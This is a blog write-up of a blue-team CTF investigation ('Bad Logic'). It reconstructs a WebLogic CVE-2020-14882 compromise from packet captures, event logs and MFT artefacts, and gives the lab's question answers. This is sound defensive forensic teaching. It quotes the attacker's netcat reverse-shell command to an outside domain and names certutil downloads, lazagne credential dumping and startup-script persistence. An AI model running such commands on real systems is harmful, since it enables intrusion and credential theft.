<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(BTLO/Investigation) - Bad Logic" /><meta name="author" content="kill5witch" /><meta property="og:locale" content="en" /><meta name="description" content="During standard servicing &amp; patching of our server the sysadmins were denied access to their Administrator account. CTF is hosted on https://blueteamlabs.online/ Scenario During standard servicing &amp; patching of our server the sysadmins were denied access to their Administrator account. Bad practices are in place here and it seems they run all services with the account they logon with. Investigate if this server has been compromised and if it has, uncover what actions-on-objectives the threat actor has completed. Remember, some of the artefacts may have been deleted. A PCAP, memory dump, MFT &amp; pre-fetch files may be of assistance. A full review of the compromised application may also be in order." /><meta property="og:description" content="During standard servicing &amp; patching of our server the sysadmins were denied access to their Administrator account. CTF is hosted on https://blueteamlabs.online/ Scenario During standard servicing &amp; patching of our server the sysadmins were denied access to their Administrator account. Bad practices are in place here and it seems they run all services with the account they logon with. Investigate if this server has been compromised and if it has, uncover what actions-on-objectives the threat actor has completed. Remember, some of the artefacts may have been deleted. A PCAP, memory dump, MFT &amp; pre-fetch files may be of assistance. A full review of the compromised application may also be in order." /><link rel="canonical" href="https://an9k0r.github.io/posts/Bad_Logic/" /><meta property="og:url" content="https://an9k0r.github.io/posts/Bad_Logic/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-01T18:33:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(BTLO/Investigation) - Bad Logic" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@kill5witch" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"kill5witch"},"description":"During standard servicing &amp; patching of our server the sysadmins were denied access to their Administrator account. CTF is hosted on https://blueteamlabs.online/ Scenario During standard servicing &amp; patching of our server the sysadmins were denied access to their Administrator account. Bad practices are in place here and it seems they run all services with the account they logon with. Investigate if this server has been compromised and if it has, uncover what actions-on-objectives the threat actor has completed. Remember, some of the artefacts may have been deleted. A PCAP, memory dump, MFT &amp; pre-fetch files may be of assistance. A full review of the compromised application may also be in order.","headline":"(BTLO/Investigation) - Bad Logic","dateModified":"2022-05-25T12:09:30+02:00","url":"https://an9k0r.github.io/posts/Bad_Logic/","datePublished":"2022-04-01T18:33:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/Bad_Logic/"},"@context":"https://schema.org"}</script><title>(BTLO/Investigation) - Bad Logic | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(BTLO/Investigation) - Bad Logic</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/2022-03-31-21-59-52.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>(BTLO/Investigation) - Bad Logic</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">kill5witch</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-04-01 18:33:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Fri, Apr 1, 2022, 6:33 PM +0200" >Apr 1, 2022</em> </span> <span> Updated <em class="timeago" date="2022-05-25 12:09:30 +0200 " data-toggle="tooltip" data-placement="bottom" title="Wed, May 25, 2022, 12:09 PM +0200" >May 25, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1399 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p><strong>During standard servicing &amp; patching of our server the sysadmins were denied access to their Administrator account.</strong></p><ul><li>CTF is hosted on https://blueteamlabs.online/<h1 id="scenario">Scenario</h1><blockquote><p>During standard servicing &amp; patching of our server the sysadmins were denied access to their Administrator account. Bad practices are in place here and it seems they run all services with the account they logon with. Investigate if this server has been compromised and if it has, uncover what actions-on-objectives the threat actor has completed. Remember, some of the artefacts may have been deleted. A PCAP, memory dump, MFT &amp; pre-fetch files may be of assistance. A full review of the compromised application may also be in order.</p></blockquote></ul><h1 id="pcap-analysis-with-wireshark">PCAP Analysis with Wireshark</h1><p>Let’s start with PCAP. We do know that there is an application which probably runs on a webserver. Apart from that, we know IPs and netstat output which can be found in the KAPE’s output.</p><p>(As PCAP is very big since it was ran over 1 whole week, you can run it with filter). Change the view of the time display to show actual time and date. <img data-src="/assets/images/2022-03-31-22-17-45.png" alt="" data-proofer-ignore></p><p>Amount of HTTP packets ist still pretty big, so either we get a list of requests that were made, like putting <code class="language-plaintext highlighter-rouge">Request URI</code> to the column list. (as seen in the screenshot above) OR filter on <code class="language-plaintext highlighter-rouge">ip.src==172.31.4.99</code> for which can we know that it is the IP of the web server. There is ipconfig output in one of the artifacts!</p><p>Let’s also filter on HTTP POST and GET and see what we get. <img data-src="/assets/images/2022-04-01-14-39-47.png" alt="" data-proofer-ignore></p><p>First of all, we end up with 121 packets, and <code class="language-plaintext highlighter-rouge">178.62.72.123</code> appears suspicious right away. First we would find <code class="language-plaintext highlighter-rouge">NMAP</code> scan (e.g. Packet 1113452) and then something that looks like payload.</p><p>Checking Google, just with pasting the payload used, we do get what CVE might have been exploited and in which application (WebLogic). <img data-src="/assets/images/2022-04-01-12-59-50.png" alt="" data-proofer-ignore></p><blockquote><p>Which application did the threat actor exploit, what port does this run on and which CVE did the threat actor utilise? (10 points): Application WebLogic runs on Port 7001 and CVE exploited appears to be <em>CVE-2020-14882</em></p></blockquote><p>If we analyze Conversation statistics in Wireshark, we get only 3 hits! (use <code class="language-plaintext highlighter-rouge">Limit to display filter</code>) <img data-src="/assets/images/2022-04-01-15-07-45.png" alt="" data-proofer-ignore></p><p>Taking another look at the Conversation statistics is only by using <code class="language-plaintext highlighter-rouge">ip.dst==172.31.4.99</code> and limiting results to the filter, we see that port 3389 is being used extensievly as well. Two IP’s have used RDP with the box which are <code class="language-plaintext highlighter-rouge">82.16.6.12</code> and <code class="language-plaintext highlighter-rouge">95.181.232.7</code> nd will be checked later. <img data-src="/assets/images/2022-04-01-15-15-07.png" alt="" data-proofer-ignore></p><p>So, let’s return to RCE exploit and check Wiresharks output for <code class="language-plaintext highlighter-rouge">ip.addr==172.31.4.99 &amp;&amp; ip.addr==178.62.72.123 &amp;&amp; http</code> <img data-src="/assets/images/2022-04-01-15-29-00.png" alt="" data-proofer-ignore></p><p>Finding <code class="language-plaintext highlighter-rouge">nc.exe</code> seems like a good find. It has got downloaded right after payload was sent to the web server.</p><blockquote><p>What was the name of the malicious file they downloaded using this windows executable? (10 points): nc.exe</p></blockquote><p>We can assume that <code class="language-plaintext highlighter-rouge">172.31.4.99</code> could have downloaded <code class="language-plaintext highlighter-rouge">nc.exe</code> from <code class="language-plaintext highlighter-rouge">178.62.72.123</code> (Host: <code class="language-plaintext highlighter-rouge">advertyzing.co.uk:443</code>).</p><blockquote><p>What is the malicious domain used by the threat actor? (10 points): advertyzing.co.uk</p></blockquote><blockquote><p>The threat actor has made good use of ‘Living off the land’ binaries (LOLBins). Which windows executable did they use to download a malicious file from their server? (10 points): Certutil.exe</p></blockquote><p>In the packet <strong>1158260</strong> we can see that command was issued to achieve reverse shell <code class="language-plaintext highlighter-rouge">nc.exe advertyzing.co.uk 443 -e powershell.exe</code> on <code class="language-plaintext highlighter-rouge">17.38.54.749676</code> so let’s turn the filter around in order to possibly find if Netcat revershe shell connection was indeed successful and which commands were ran (…hoping for unencrypted traffic between our server and threat actor…) Filter user: <code class="language-plaintext highlighter-rouge">ip.src==172.31.4.99 &amp;&amp; ip.dst==178.62.72.123 &amp;&amp; tcp.port==443</code></p><p>In one of the last TCP packets we can see that local Administrator’s password was changed. <img data-src="/assets/images/2022-04-01-15-47-37.png" alt="" data-proofer-ignore></p><p>Session stops here which is interessting. Attacker has now persistence and we know that RDP and WINRM are running. (this can actually be seen in the netcats’ output or check KAPE’s output from <em>netstat</em>) <img data-src="/assets/images/2022-04-01-15-50-04.png" alt="" data-proofer-ignore></p><p>Now recall(!) we’ve saw connections on RDP/TCP3389 from two IP-Adresses <code class="language-plaintext highlighter-rouge">82.16.6.12</code> and <code class="language-plaintext highlighter-rouge">95.181.232.7</code> so let’s have a look in the wireshark. Filter: <code class="language-plaintext highlighter-rouge">ip.dst==172.31.4.99 &amp;&amp; tcp.port==3389 &amp;&amp; (ip.src==82.16.6.12 || ip.src==95.181.232.7)</code> as <code class="language-plaintext highlighter-rouge">82.16.6.12</code> has used RDP before and <code class="language-plaintext highlighter-rouge">95.181.232.7</code> used RDP shortly after attack, this one should be in our focus. Since RDP is encrypted there’s not much to see in the PCAP itself apart from this packet. <img data-src="/assets/images/2022-04-01-16-02-43.png" alt="" data-proofer-ignore> Let’s also not forget the time of the first access that we’ve saw in the PCAP.</p><blockquote><p>Confirm the two IP addresses utilized by the threat actor (10 points): 178.62.72.123,95.181.232.7</p></blockquote><p>One useful thing (which is not encrypted) could be checking DNS requests in PCAP however output will be lengthy and we do have DNS Requests logged in the KAPE’s output. Just something to keep in mind if checking more than host.</p><p>PCAP Analysis ends here.</p><h1 id="artifact-analysis">Artifact Analysis</h1><p>So, the assumption now is that attacker used RDP using Administrator’s account from <code class="language-plaintext highlighter-rouge">95.181.232.7</code>. Let’s check if we can find that in the Event Logs (Security). <img data-src="/assets/images/2022-04-01-16-18-57.png" alt="" data-proofer-ignore></p><p>To navigate, i’ll use powershell and <code class="language-plaintext highlighter-rouge">gci -Path C:\ -Name Security.evtx -Recurse</code> to find the EventFile although it can be found in the default location <code class="language-plaintext highlighter-rouge">Target_Options\C\Windows\System32\winevt\logs\Security.evtx</code>.</p><h2 id="evtxecmdexe">EvtxECmd.exe<a href="#evtxecmdexe" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>To avoid checking Event Logs in the Event Explorer, let’s rather do it in Timeline after parsing Events using <code class="language-plaintext highlighter-rouge">EventxECmd.exe</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:\Users\BTLOTest\Desktop\Tools\EvtxExplorer\EvtxECmd.exe -f C:\Users\BTLOTest\Desktop\MD-Artefacts\Target_Options\C\Windows\System32\winevt\logs\Security.evtx --csv C:\Users\BTLOTest\Desktop\MD-Artefacts\security_evtx
</pre></table></code></div></div><p>Opening output in Timeline Explorer and filtering on IP we can see that Login was successful. <img data-src="/assets/images/2022-04-01-16-37-34.png" alt="" data-proofer-ignore></p><h2 id="checking-ps-consolehost_history">Checking PS ConsoleHost_history<a href="#checking-ps-consolehost_history" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Checking Console history may be a quick win for us, if threat actor ran commands through powershell and didn’t clean the history afterwards. <img data-src="/assets/images/2022-04-01-21-19-02.png" alt="" data-proofer-ignore></p><p>Apart from the legitimate output, threat actor ran <em>lazagne</em> credential dump program using powershell.</p><blockquote><p>What is the name of the password dumping tool used by the threat actor? (10 points): lazagne</p></blockquote><p>From here we will be checking AmCache which serves for application compatibility through different Windows versions <strong>and leaves artifacts behind</strong>.</p><h2 id="checking-amcache">Checking AmCache<a href="#checking-amcache" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat .\20210304223141_Amcache_AssociatedFileEntries.csv | ConvertFrom-Csv -delimiter "," |out-gridview
</pre></table></code></div></div><p><img data-src="/assets/images/2022-04-01-21-00-38.png" alt="" data-proofer-ignore> We can see that there’s program installed named Kryptex. What is Kryptex</p><blockquote><p>Get paid for the computing power of your PC. Kryptex mines cryptocurrency and pays you bitcoins or real-world money. Source: https://www.kryptex.org</p></blockquote><p>There we also have an answer to this question</p><blockquote><p>The threat actor has used an off-the-shelf cryptominer, what is the name of the executable? (10 points): kryptex.exe</p></blockquote><blockquote><p>What is the name of the text file the TA echo’ed out to? (10 points): password_extract.txt</p></blockquote><h2 id="checking-mft-using-timeline-explorer">Checking MFT using Timeline Explorer<a href="#checking-mft-using-timeline-explorer" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>MFT should give us information about File System (File Creation, Deletion, Renaming etc.), however there are two Hives, J and MFT. Do check this video to get an approximate idea what MFT is: https://www.youtube.com/watch?v=_qElVZJqlGY&amp;t=635s</p><h3 id="checking-20210304223305mftecmdj_outputcsv">Checking 20210304223305<em>MFTECmd</em>$J_Output.csv<a href="#checking-20210304223305mftecmdj_outputcsv" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>FilePath: <code class="language-plaintext highlighter-rouge">C:\Users\BTLOTest\Desktop\MD-Artefacts\Module_Options\FileSystem\20210304223305_MFTECmd_$J_Output.csv</code></p><p>We know approximate Time of login, so let’s start there. Filter the date. <img data-src="/assets/images/2022-04-05-10-38-55.png" alt="" data-proofer-ignore></p><p>If any files were dropped to disk we should see that filtering <code class="language-plaintext highlighter-rouge">Update Reasons</code> with <code class="language-plaintext highlighter-rouge">FileCreate</code> but we’re still left of with many entries. Maybe grouping the Extensions and checking the interesting ones might work. <img data-src="/assets/images/2022-04-05-10-49-40.png" alt="" data-proofer-ignore> By scrolling a little bit, there we can find <em>kryptex.exe, lasagne.exe, elevate.exe</em>. Under <code class="language-plaintext highlighter-rouge">.bat</code> we can find <code class="language-plaintext highlighter-rouge">StartWebLogic.bat</code></p><p>Now since i haven’t been able to filter the data the way i wanted (after Date AND HOUR) i resorted to Linux Subsystem (type <code class="language-plaintext highlighter-rouge">wsl</code> in cmd). <img data-src="/assets/images/2022-04-05-13-24-32.png" alt="" data-proofer-ignore></p><p>At first, i just wanted to get an idea what was ran after user logged in so i grepped everything after 19:40. Interessting files were <code class="language-plaintext highlighter-rouge">.exe, .bat, .xml</code>, which is why i drilled down to only unique values in the end. Command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>grep -E "2021-03-04 19:[4-5][0-9]" 20210304223305_MFTECmd_\$J_Output.csv | awk -F"," '{print $8,$1}' | sort -u -t "," -k 1,1 | grep -E ".xml|.exe|.bat" | sort -u
</pre></table></code></div></div><h3 id="checking-20210304223233mftecmdmft_outputcsv">Checking 20210304223233<em>MFTECmd</em>$MFT_Output.csv<a href="#checking-20210304223233mftecmdmft_outputcsv" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>FilePath: <code class="language-plaintext highlighter-rouge">C:\Users\BTLOTest\Desktop\MD-Artefacts\Module_Options\FileSystem\20210304223233_MFTECmd_\$MFT_Output.csv</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>grep -a -E "2021-03-04 18:[0-5][0-9]" 20210304223233_MFTECmd_\$MFT_Output.csv | awk -F"," '{print $20,$6,$7}'
</pre></table></code></div></div><p>One of the files that were changed is <code class="language-plaintext highlighter-rouge">config.json</code>. Below output in <code class="language-plaintext highlighter-rouge">wsl</code> and <em>Timeline Explorer</em>. <img data-src="/assets/images/2022-04-05-17-20-48.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/images/2022-04-05-17-23-04.png" alt="" data-proofer-ignore></p><p>File is still on disk <img data-src="/assets/images/2022-04-05-18-58-46.png" alt="" data-proofer-ignore></p><blockquote><p>What email address is associated with the threat actor? (10 points): bzuyxpdpphthhbvxpz@niwghx.com</p></blockquote><p>Same could be found in the MEMdump, but it’s hard to predict where did the email came from.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat md-memdump.raw | strings | egrep -a '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b'
</pre></table></code></div></div><p><img data-src="/assets/images/2022-04-05-19-10-15.png" alt="" data-proofer-ignore></p><h2 id="loading-application-event-logs">Loading application Event Logs<a href="#loading-application-event-logs" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Extract the EVTX Logs into CSV using EvtxECmd:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:\Users\BTLOTest\Desktop\Tools\EvtxExplorer\EvtxECmd.exe -f C:\Users\BTLOTest\Desktop\MD-Artefacts\Target_Options\C\Windows\System32\winevt\logs\Application.evtx --csv . --csvf application
</pre></table></code></div></div><p>Interessting is following entry: <img data-src="/assets/images/2022-04-05-16-59-34.png" alt="" data-proofer-ignore></p><p>Apparently Web Service was restarted using some sort of configuration file. Checking the C drive (not sure if intentional or not) <code class="language-plaintext highlighter-rouge">startWebLogic.cmd</code> is there, including startWebLogic.bat which was modified on the same date</p><p><img data-src="/assets/images/2022-04-05-18-39-23.png" alt="" data-proofer-ignore></p><p>Getting the file hash <img data-src="/assets/images/2022-04-05-18-42-43.png" alt="" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">5DCF26E3FBCE71902B0CD7C72C60545B</code> is nc.exe binary</p><blockquote><p>The threat actor has attempted an unusual way of persisting by editing a key file. Which configuration file have they altered? (10 points): startWebLogic.cmd</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blueteamlabs/'>BlueTeamLabs</a>, <a href='/categories/digital-forensics/'>Digital Forensics</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/eventviewer/" class="post-tag no-text-decoration" >EventViewer</a> <a href="/tags/wireshark/" class="post-tag no-text-decoration" >Wireshark</a> <a href="/tags/tshark/" class="post-tag no-text-decoration" >TShark</a> <a href="/tags/mftexplorer/" class="post-tag no-text-decoration" >MFTExplorer</a> <a href="/tags/cli/" class="post-tag no-text-decoration" >CLI</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(BTLO/Investigation) - Bad Logic - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Bad_Logic/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(BTLO/Investigation) - Bad Logic - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/Bad_Logic/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(BTLO/Investigation) - Bad Logic - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Bad_Logic/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 